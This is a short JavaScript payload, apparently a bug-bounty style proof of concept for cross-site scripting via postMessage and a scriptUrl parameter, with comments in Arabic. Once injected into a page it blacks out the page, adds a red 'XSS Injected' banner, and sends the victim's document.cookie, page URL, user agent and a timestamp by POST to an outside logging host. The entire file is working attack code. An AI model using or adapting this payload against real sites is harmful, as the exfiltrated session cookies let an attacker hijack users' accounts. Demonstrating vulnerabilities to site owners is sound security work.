// ✅ XSS PoC: Confirmed Script Execution via postMessage Injection
console.log("🔥 XSS via scriptUrl executed!");

// 1. تغيير شكل الصفحة بالكامل
document.body.style.background = "#000";
document.body.style.color = "#0f0";
document.body.style.fontFamily = "monospace";

// 2. إدخال بانر واضح في أعلى الصفحة
const banner = document.createElement("div");
banner.innerHTML = "🚨 XSS Injected via postMessage + scriptUrl";
banner.style.position = "fixed";
banner.style.top = "0";
banner.style.left = "0";
banner.style.width = "100%";
banner.style.padding = "20px";
banner.style.background = "red";
banner.style.color = "white";
banner.style.fontSize = "20px";
banner.style.textAlign = "center";
banner.style.zIndex = "9999";
document.body.appendChild(banner);

// 3. إرسال البيانات كإثبات (مثال: document.cookie)
fetch("https://xss.oma.rs/log", {
  method: "POST",
  body: JSON.stringify({
    cookie: document.cookie,
    location: window.location.href,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  }),
  headers: {
    "Content-Type": "application/json"
  }
});
